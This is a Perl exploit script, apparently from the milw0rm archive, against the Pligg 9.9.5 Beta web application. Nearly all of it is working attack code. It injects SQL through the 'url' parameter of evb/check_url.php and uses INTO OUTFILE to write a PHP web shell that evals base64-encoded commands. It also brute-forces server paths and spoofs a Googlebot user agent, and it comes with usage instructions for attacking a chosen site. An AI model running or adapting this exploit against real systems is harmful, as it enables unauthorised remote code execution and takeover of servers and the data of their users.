#!/usr/bin/perl

=about

 Pligg 9.9.5 Beta Perl exploit

 AUTHOR
	discovered & written by Ams
	ax330d [doggy] gmail [dot] com

 VULN. DESCRIPTION:
	Vulnerability hides in 'evb/check_url.php'
	unfiltered $_GET['url'] parameter.
	Actually, it has filtration.
	Filtration strips tags and converts html
	special chars , but it is not enough,
	because we can use MySQLs CHAR() function
	to convert shell to allowed chars.

 EXPLOIT WORK:
	Firtsly, exploit tryes to get full server
	path, but if not succeeded, then it will brute it.
	If path has been found then exploit will try
	to upload tiny shell via SQl-Injection.

 REQUIREMENTS:
	MySQL should be able to write to file.
	Know full server path to portal.
	magiq_quotes_gpc=off

=cut

use strict;
use warnings;
use LWP::UserAgent;
use HTTP::Request::Common;

Banner();

$| = 1;
my $expl_url  = shift or Usage();
my $serv_path = shift || '';

my $spider = LWP::UserAgent->new;
$spider->timeout( 9 );
$spider->agent('Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)');

my $def_shell = '/libs/manager.php';
my $shell     = q(<?php @eval(base64_decode($_GET['cmd']));?>);
my $sql_shell = join ',', map { ord } split //, $shell;

my @paths = qw(
	/var/www/htdocs /var/www/localhost/htdocs /var/www /var/wwww/hosting /var/www/html /var/www/vhosts
	/home/www  /home/httpd/vhosts
	/usr/local/apache/htdocs
	/www/htdocs
);

exploit( $expl_url );

sub exploit {

	$_ = shift;
	print "\n\tExploiting: $_";

	my ( $packet, $rcvd, $injection );
	my ( $prot, $host, $path, ) = m{(?:([^:/?#]+):)?(?://([^/?#]*))?([^?#]*)(?:\?([^#]*))?(?:#(.*))?};

	my $req = GET "$prot://$host$path/evb/check_url.php";
	my $res = $spider->request( $req );
	$serv_path = $res->content =~ /template\s+in\s+(.*?)config\.php/
		? $1
		: $serv_path;

	if ( $serv_path ne '' ) {

		print "\n\tFound server path: $serv_path";

		chomp( $serv_path );
		$injection = "' UNION SELECT CHAR($sql_shell),'' INTO OUTFILE '$serv_path$def_shell'--  ";
		$req = GET "$prot://$host$path/evb/check_url.php?url=" . Url_Encode( $injection );
		$res = $spider->request( $req );

	} else {

		print "\n\tUnable to find path, starting bruteforce...\n";

		for $serv_path ( @paths ) {

			printf "\tTrying: $serv_path$path$def_shell %s\r", '  ' x 10;

			chomp( $serv_path );
			$injection = "' UNION SELECT CHAR($sql_shell),'' INTO OUTFILE '$serv_path$path$def_shell'--  ";
			$req = GET "$prot://$host$path/evb/check_url.php?url=" . Url_Encode( $injection );
			$res = $spider->request( $req );
		}
	}

	#	Checking for shell presence
	$req = HEAD "http://$host$path$def_shell";
	$res = $spider->request( $req );

	if ( $res->status_line =~ /200/ ) {
		print "\n\tExploited: http://$host$path$def_shell\n\n";
	} else {
		print "\n\tExploiting failed\n\n";
	}

}

#	Light wheel...
sub Url_Encode {
	$_ = shift;
	s/([^A-Za-z0-9])/sprintf("%%%02X", ord($1))/seg;
	return $_;
}

sub Usage {
	print "\n\tUsage:\t$0 http://site.com [full server path]

	Example:
		$0 http://localhost/ /var/www/htdocs
		$0 http://localhost/\n\n";
	exit;
}

sub Banner {
	print "
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	  Pligg 9.9.5 Beta Perl exploit
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n";
}

# milw0rm.com [2008-12-22]